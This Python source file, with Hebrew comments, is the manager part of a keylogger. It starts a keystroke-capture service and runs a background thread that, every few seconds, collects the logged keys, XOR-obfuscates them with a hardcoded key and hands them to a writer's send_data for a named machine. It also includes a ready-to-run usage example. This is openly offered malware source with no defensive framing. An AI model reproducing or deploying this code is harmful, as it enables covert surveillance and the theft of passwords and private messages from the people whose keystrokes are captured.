import threading
import time
from keyloggerService import KeyLoggerService

from FileWriter import FileWriter
from Encryptor import Encryptor as crp



import os
print("הקובץ נוצר בתיקייה:", os.getcwd())

class KeyLoggerManager:
    def __init__(self, interval_seconds: int, machine_name: str = "log"):
        """
        :param interval_seconds: כל כמה שניות לשמור את הלוג לקובץ
        :param machine_name: שם הקובץ שאליו ייכתב המידע
        """
        self.interval = interval_seconds
        self.machine_name = machine_name
        self.logger = KeyLoggerService(on_escape_callback = self.stop)
        self.writer = FileWriter()
        self.running = False
        self.thread = None

    def _run(self):
        """לולאה שרצה ברקע ושומרת כל כמה שניות את ה-buffer לקובץ"""
        while self.running:
            time.sleep(self.interval)
            data = self.logger.get_logged_keys()

            if data:  # רק אם יש נתונים

                xor = crp.xor_encrypt(data,"avi")
                self.writer.send_data(xor, self.machine_name)

    def start(self):
        """מתחיל את ההאזנה ואת לולאת השמירה"""
        self.logger.start_logging()
        self.running = True
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()

    def stop(self):
        """עוצר הכל"""
        if self.running:
            self.running = False
            self.logger.stop_logging()
            if self.thread:
                self.thread.join()
                self.thread = None
            print("Keylogger stopped.")
            os._exit(0)  # יציאה מיידית מכל התוכנית


# דוגמה לשימוש
if __name__ == "__main__":
    manager = KeyLoggerManager(interval_seconds=5, machine_name="DAVID")
    manager.start()
    print("Keylogger started, לחץ ESC לעצירה...")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        manager.stop()
    print("Keylogger stopped.")